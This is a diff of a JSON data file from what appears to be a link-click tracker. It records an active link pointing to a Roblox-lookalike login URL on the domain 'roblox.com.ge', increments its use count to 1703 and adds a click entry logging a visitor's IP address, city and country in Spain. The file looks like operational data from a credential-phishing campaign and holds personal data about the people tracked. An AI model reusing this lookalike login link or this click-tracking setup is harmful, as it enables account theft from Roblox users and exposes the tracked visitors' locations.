@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1702,
+    "useCount": 1703,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13779,6 +13779,14 @@
       },
       {
         "timestamp": 1777670828826,
+        "ip": "213.94.23.180",
+        "country": "Spain",
+        "city": "La Unión",
+        "flag": "🇪🇸",
+        "countryCode": "ES"
+      },
+      {
+        "timestamp": 1777670897753,
         "ip": "213.94.23.180",
         "country": "Spain",
         "city": "La Unión",
